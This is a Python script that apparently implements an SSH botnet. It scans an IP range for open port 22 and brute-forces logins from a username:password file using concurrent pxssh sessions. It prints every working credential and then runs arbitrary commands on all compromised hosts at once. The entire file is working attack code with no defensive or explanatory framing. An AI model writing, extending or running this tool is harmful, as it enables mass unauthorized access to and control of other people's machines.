import ipaddress
import socket
from pexpect import pxssh
import concurrent.futures

def check_port(ip, port=22, timeout=0.05):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as a_socket:
        a_socket.settimeout(timeout)
        result = a_socket.connect_ex((ip, port))
        return result == 0

class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except pxssh.ExceptionPxssh as e:
            return None

class Botnet:
    def __init__(self, max_threads):
        self.max_threads = max_threads
        self.clients = []

    def add_client(self, host, user, password):
        if check_port(host):
            client = Client(host, user, password)
            if client.session:
                self.clients.append(client)
                return True
        return False

    def gather_bots(self, ip_range, credentials_file):
        network = ipaddress.ip_network(ip_range)
        with open(credentials_file, 'r') as file:
            credentials = [line.strip().split(':') for line in file]

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self.attempt_login, ip, credentials) for ip in network.hosts()]
            valid_credentials = [future.result() for future in concurrent.futures.as_completed(futures) if future.result()]

        if valid_credentials:
            print("[+] Valid credentials found:")
            for ip, user, passw in valid_credentials:
                print(f"    - {ip} with {user}:{passw}")
            print(f"[+] {len(valid_credentials)} Bots added successfully.")
        else:
            print("[-] No valid credentials found.")

    def attempt_login(self, ip, credentials):
        ip_str = str(ip)
        if check_port(ip_str, 22):
            for user, password in credentials:
                if self.add_client(ip_str, user, password):
                    return ip_str, user, password
        return None

    def list_bots(self):
        if self.clients:
            print("[+] Listing connected bots:")
            for client in self.clients:
                print(f"    - {client.host} as {client.user}")
        else:
            print("[-] No bots connected.")

    def execute(self, command):
        if self.clients:
            print("[+] Executing command on all bots:")
            for client in self.clients:
                client.session.sendline(command)
                client.session.prompt()
                print(f'{client.user}@{client.host}: {client.session.before.decode()}')
        else:
            print("[-] No bots connected.")